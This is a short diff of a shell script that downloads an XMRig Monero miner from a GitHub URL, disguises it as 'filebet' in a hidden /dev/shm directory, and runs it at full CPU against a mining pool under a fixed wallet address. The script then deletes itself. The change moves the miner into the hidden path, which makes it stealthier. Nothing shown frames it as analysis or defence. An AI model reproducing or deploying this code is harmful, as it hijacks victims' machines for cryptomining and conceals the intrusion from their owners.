@@ -10,7 +10,7 @@ if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig" -o 
   exit 1
 fi
 
-chmod +x "$local"filebet
-exec "$local"filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p couch -k --cpu-max-threads-hint=100% -B
+chmod +x /dev/shm/.filebet/filebet
+/dev/shm/.filebet/filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p couch -k --cpu-max-threads-hint=100% -B
 
 rm -f $0
